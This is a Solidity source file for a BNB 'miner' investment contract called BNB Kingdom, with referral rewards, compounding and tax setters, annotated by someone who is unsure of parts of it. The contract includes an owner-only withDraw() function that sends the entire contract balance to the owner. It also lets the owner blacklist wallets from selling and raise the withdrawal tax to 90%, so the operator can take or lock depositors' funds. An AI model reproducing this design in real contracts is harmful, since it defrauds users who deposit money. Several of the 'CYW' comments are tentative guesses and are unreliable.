// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


/*
*
* ██████╗ ███╗   ██╗██████╗     ██╗  ██╗██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ███╗   ███╗
* ██╔══██╗████╗  ██║██╔══██╗    ██║ ██╔╝██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║
* ██████╔╝██╔██╗ ██║██████╔╝    █████╔╝ ██║██╔██╗ ██║██║  ███╗██║  ██║██║   ██║██╔████╔██║
* ██╔══██╗██║╚██╗██║██╔══██╗    ██╔═██╗ ██║██║╚██╗██║██║   ██║██║  ██║██║   ██║██║╚██╔╝██║
* ██████╔╝██║ ╚████║██████╔╝    ██║  ██╗██║██║ ╚████║╚██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║
* ╚═════╝ ╚═╝  ╚═══╝╚═════╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝
*                                                                                     
* BNB Kingdom - BNB Miner
*
* Website  : https://bnbkingdom.xyz
* Twitter  : https://twitter.com/BNBKingdom
* Telegram : https://t.me/BNBKingdom
*
*/

// CYW: Create a contact name with "Ownable", call this function to transfer to the new "Ownership".
contract Ownable{
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _owner = msg.sender;
    }

// CYW: Fetch the address of the current owner.
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

// CYW: Only `owner` can call the target function, elas will prompt related message.
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

// CYW: Only owner can set the contract to 'ownerless', it cant be change anything by anyone anymore but it has improve the security of the contract.
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

// CYW: Only owner can use this function, check is the `newOwner` are `ownerless` if is `false` it will treansfer to new owner,
//      else prompt "Ownable: new owner is the zero address".
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

// CYW: Transfer the contract to the new owner from current owner.
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// CYW: This is some 'arithmetic operations' for safely in smart contracts to prevent overflows and underflows.
library SafeMath {

// CYW: Multiplies two uint256 numbers a and b. It checks for overflow by verifying that the result of the multiplication divided by a is equal to b.
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

// CYW: Divides two uint256 numbers a and b. It does not explicitly check for division by zero, so you should ensure that b is non-zero before calling this function.
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

// CYW: Subtracts b from a. It checks that b is less than or equal to a to prevent underflow.
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

// CYW: Adds a and b. It checks that the result of the addition is greater than or equal to a to prevent overflow.
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

// CYW: Calculates the remainder of the division of a by b. It requires that b is not equal to zero to prevent division by zero.
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

// CYW: The main logic of the code ?? 
contract BNBKingdom is Ownable {

// CYW: After declear this, you can use the `SafeMath` function by just `a.add(b)` but not `SafeMath.add(a, b);`.
    using SafeMath for uint256;

// CYW: Creating some variable with value ?? 
    /* base parameters */
    uint256 public EGGS_TO_HIRE_1MINERS = 864000;
    uint256 public REFERRAL = 120;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 private TAX = 25;
    uint256 public MARKET_EGGS_DIVISOR = 5;
    uint256 public MARKET_EGGS_DIVISOR_SELL = 2;

    uint256 public MIN_INVEST_LIMIT = 1 * 1e16; /* 0.01 BNB  */
    uint256 public WALLET_DEPOSIT_LIMIT = 50 * 1e18; /* 50 BNB  */

	uint256 public COMPOUND_BONUS = 0;
	uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
    uint256 public COMPOUND_STEP = 24 * 60 * 60;

    uint256 public WITHDRAWAL_TAX = 500;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 6;

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 private marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    bool private contractStarted;
    bool public blacklistActive = true;
    mapping(address => bool) public Blacklisted;

	uint256 public CUTOFF_STEP = 48 * 60 * 60;
	uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;

    /* addresses */
    // address private owner;
    address payable private dev1;
    address payable private dev2;

// CYW: User data structure, something like "Object" or DB blueprint.
    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 farmerCompoundCount; //added to monitor farmer consecutive compound without cap
        uint256 lastWithdrawTime;
    }

// CYW: Create key-value data structures for the `User`.
    mapping(address => User) public users;

// CYW: Initializes the state variables, reverted if the requirement is not meet ?? 
    constructor(address payable _dev1, address payable _dev2) {
		require(!isContract(_dev1) && !isContract(_dev2));
        // owner = msg.sender;
        dev1 = _dev1;
        dev2 = _dev2;
        marketEggs = 144000000000;
    }

// CYW: Return the boolean result if the `size > 0`.
	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

// CYW: Only admin can active the `setblacklistActive` function.
    function setblacklistActive(bool isActive) public{
        require(msg.sender == owner(), "Admin use only.");
        blacklistActive = isActive;
    }

// CYW: Only admin can use, it allows the owner to blacklist or unblacklist a wallet by setting its status in the Blacklisted mapping.
    function blackListWallet(address Wallet, bool isBlacklisted) public{
        require(msg.sender == owner(), "Admin use only.");
        Blacklisted[Wallet] = isBlacklisted;
    }

// CYW: Only admin can use, it is a more efficient way to manage the blacklist status of multiple addresses in one transaction.
    function blackMultipleWallets(address[] calldata Wallet, bool isBlacklisted) public{
        require(msg.sender == owner(), "Admin use only.");
        for(uint256 i = 0; i < Wallet.length; i++) {
            Blacklisted[Wallet[i]] = isBlacklisted;
        }
    }

// CYW: Only admin can use, this allows the contract owner to check whether a specific wallet address is blacklisted within the contract.
    function checkIfBlacklisted(address Wallet) public view returns(bool blacklisted){
        require(msg.sender == owner(), "Admin use only.");
        blacklisted = Blacklisted[Wallet];
    }

// CYW: A function that need to check the current user is eligible to compound their rewards under certain conditions when the `contractStarted` is true ?? 
    function CompoundRewards(bool isCompound) public {
        User storage user = users[msg.sender];
        require(contractStarted, "Contract not yet Started.");

        uint256 eggsUsed = getMyEggs();
        uint256 eggsForCompound = eggsUsed;

        if(isCompound) {
            uint256 dailyCompoundBonus = getDailyCompoundBonus(msg.sender, eggsForCompound);
            eggsForCompound = eggsForCompound.add(dailyCompoundBonus);
            uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
            user.userDeposit = user.userDeposit.add(eggsUsedValue);
            totalCompound = totalCompound.add(eggsUsedValue);
        } 

        if(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP) {
            if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
            }
            //add compoundCount for monitoring purposes.
            user.farmerCompoundCount = user.farmerCompoundCount.add(1);
        }
        
        user.miners = user.miners.add(eggsForCompound.div(EGGS_TO_HIRE_1MINERS));
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;

        marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));
    }

// CYW: This function is selling lands(assets?) within the contract, 
//      with certain tax implications depending on the user's daily compound bonus and blacklist status ?? 
    function SellLands() public{
        require(contractStarted, "Contract not yet Started.");

        if (blacklistActive) {
            require(!Blacklisted[msg.sender], "Address is blacklisted.");
        }

        User storage user = users[msg.sender];
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        
        /** 
            if user compound < to mandatory compound days**/
        if(user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and eggValue will be deducted with 50% feedback tax.
            eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //set daily compound bonus count to 0 and eggValue will remain without deductions
             user.dailyCompoundBonus = 0;   
             user.farmerCompoundCount = 0;  
        }
        
        user.lastWithdrawTime = block.timestamp;
        user.claimedEggs = 0;  
        user.lastHatch = block.timestamp;
        marketEggs = marketEggs.add(hasEggs.div(MARKET_EGGS_DIVISOR_SELL));
        
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(payFees(eggValue));
        payable(address(msg.sender)).transfer(eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);
    }

     
// CYW: This function is appears to be used for users to buy lands(assets?) in the contract,
//      with provisions for referrals and various calculations related to rewards and deposits ?? 
    /* transfer amount of BNB */
    function BuyLands(address ref) public payable{
        require(contractStarted, "Contract not yet Started.");
        User storage user = users[msg.sender];
        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
        user.userDeposit = user.userDeposit.add(msg.value);
        user.initialDeposit = user.initialDeposit.add(msg.value);
        user.claimedEggs = user.claimedEggs.add(eggsBought);

        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }

            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
                
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
                payable(address(upline)).transfer(refRewards);
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }

        uint256 eggsPayout = payFees(msg.value);
        totalStaked = totalStaked.add(msg.value.sub(eggsPayout));
        totalDeposits = totalDeposits.add(1);
        CompoundRewards(false);
    }

// CYW: Check the `contractStarted` status, if is `false` and is the `owner` it will set the status to `true`, 
//      else it will 'undo' all the change in this function and prompt "Contract not yet started.".
    function startKingdom(address addr) public payable{
        if (!contractStarted) {
    		if (msg.sender == owner()) {
    			contractStarted = true;
                BuyLands(addr);
    		} else revert("Contract not yet started.");
    	}
    }

// CYW: This Solidity code creates a function that lets users send BNB to the contract. The contract can receive BNB but doesn't do anything with it ?? 
    //fund contract with BNB before launch.
    function fundContract() external payable {}

// CYW: Some calculation function that will returns 5 times the calculated tax as a result. 
    function payFees(uint256 eggValue) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
        dev1.transfer(tax);
        dev2.transfer(tax);
        return tax.mul(5);
    }

// CYW: If the target user `dailyCompoundBonus` is 0 will return 0, else do some calculations and return the value.
    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

// CYW: Get the user information and return it.
    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _lastHatch, address _referrer, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _farmerCompoundCount, uint256 _lastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedEggs = users[_adr].claimedEggs;
         _lastHatch = users[_adr].lastHatch;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralEggRewards = users[_adr].referralEggRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
         _farmerCompoundCount = users[_adr].farmerCompoundCount;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
	}

// CYW: Return the target user related information.
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

// CYW: Return the current block's timestamp.
    function getTimeStamp() public view returns (uint256) {
        return block.timestamp;
    }

// CYW: Return the target user related information.
    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

// CYW: Return the related data(Trade value?) after done some calculations ?? 
    //  Supply and demand balance algorithm 
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
    // (PSN * bs)/(PSNH + ((PSN * rs + PSNH * rt) / rt)); PSN / PSNH == 1/2
    // bs * (1 / (1 + (rs / rt)))
    // purchase ： marketEggs * 1 / ((1 + (this.balance / eth)))
    // sell ： this.balance * 1 / ((1 + (marketEggs / eggs)))
        return SafeMath.div(
                SafeMath.mul(PSN, bs), 
                    SafeMath.add(PSNH, 
                        SafeMath.div(
                            SafeMath.add(
                                SafeMath.mul(PSN, rs), 
                                    SafeMath.mul(PSNH, rt)), 
                                        rt)));
    }

// CYW: Get related data(trade value?) from `calculateTrade` by given different parameter.
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

// CYW: Get related data(trade value?) from `calculateTrade` by given different parameter.
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

// CYW: Get related data(trade value?) from `calculateEggBuy`, 
//      and in this function also passing the related data to `calculateTrade` to do more customization calculation.
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

// CYW: Pass the data one by one into different function parameter to calculate and return value(trade value?) and the net worth of the day ?? 
    /* How many lands per day user will receive based on BNB deposit */
    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

// CYW: Get related data(trade value?) from `calculateTrade` by given different parameter ?? 
    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

// CYW: Return the related info when calling this function.
//      (No need declare something like `_totalStaked = totalStaked;`, Solidity knows you're returning the values of these state variables.)
    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

// CYW: Get `miners`(funds?) info from sender and return it.
    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

// CYW: Return the ??? value of sender ?? 
    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

// CYW: Return the ??? value after some calculations by giving the target address ?? 
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
                            /* get min time. */
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

// CYW: Return the minimum value by compare by the 2 value giving parameter.
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

// CYW: Only admin can transfer the ownership.
    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner(), "Admin use only.");
        transferOwnership(value);
    }

// CYW: Only admin can change the `dev1` address.
    function CHANGE_DEV1(address value) external {
        require(msg.sender == dev1, "Admin use only.");
        dev1 = payable(value);
    }

// CYW: Only admin can change the `dev2` address.
    function CHANGE_DEV2(address value) external {
        require(msg.sender == dev2, "Admin use only.");
        dev2 = payable(value);
    }

    /* percentage setters */

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%
    // 1080000 - 8%, 959000 - 9%, 864000 - 10%, 720000 - 12%
    
// CYW: Only admin and the `value` is between 3% to 12% can execute this function, it will assign the `value` to the target variable.
    function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value >= 479520 && value <= 720000); /* min 3% max 12%*/
        EGGS_TO_HIRE_1MINERS = value;
    }

// CYW: Only admin and the `value` is between 10 to 100 can execute this function, it will assign the target variable.
    function PRC_REFERRAL(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value >= 10 && value <= 100);
        REFERRAL = value;
    }

// CYW: Only admin and the `value` is less than 50 can execute this function, it will assign the `value` to the target variable.
    function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 50);
        MARKET_EGGS_DIVISOR = value;
    }

// CYW: Only admin and the `value` is less than 50 can execute this function, it will assign the `value` to the target variable.
    function PRC_MARKET_EGGS_DIVISOR_SELL(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 50);
        MARKET_EGGS_DIVISOR_SELL = value;
    }

// CYW: Only admin and the `value` is less than 900 can execute this function, it will assign the `value` to the target variable.
    function SET_WITHDRAWAL_TAX(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 900);
        WITHDRAWAL_TAX = value;
    }

// CYW: Only admin and the `value` is between 10 to 900 can execute this function, it will assign the `value` to the target variable.
    function BONUS_DAILY_COMPOUND(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value >= 10 && value <= 900);
        COMPOUND_BONUS = value;
    }

// CYW: Only admin and the `value` is between 10 to 900 can execute this function, it will assign the `value` to the target variable.
    function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 30);
        COMPOUND_BONUS_MAX_TIMES = value;
    }

// CYW: Only admin and the `value` is less than 24 can execute this function, it will assign the (`value` * 60 * 60) to the target variable.
    function BONUS_COMPOUND_STEP(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 24);
        COMPOUND_STEP = value * 60 * 60;
    }

// CYW: Only admin can use and it will assign the (`value` * 1e18) to the target variable.
    function SET_INVEST_MIN(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        MIN_INVEST_LIMIT = value * 1e18;
    }

// CYW: Only admin can use and it will assign the (`value` * 60 * 60) to the target variable.
    function SET_CUTOFF_STEP(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        CUTOFF_STEP = value * 60 * 60;
    }

// CYW: Only admin and the `value` is less than 24 can execute this function, it will assign the (`value` * 60 * 60) to the target variable.
    function SET_WITHDRAW_COOLDOWN(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        require(value <= 24);
        WITHDRAW_COOLDOWN = value * 60 * 60;
    }

// CYW: Only admin and the `value` is bigger than 10 can execute this function, it will assign the (`value` * 1 ether) to the target variable.
    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner(), "Admin use only");
        require(value >= 10);
        WALLET_DEPOSIT_LIMIT = value * 1 ether;
    }

// CYW: Only admin and the `value` is less than requirement can execute this function, it will assign the `value` to the target variable.
    function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
        require(msg.sender == owner(), "Admin use only.");
        require(value <= 12);
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
    }

// CYW: Only `owner` can transfer the balance to their address ?? 
    function withDraw () onlyOwner public{
        payable(msg.sender).transfer(address(this).balance);
    }
}
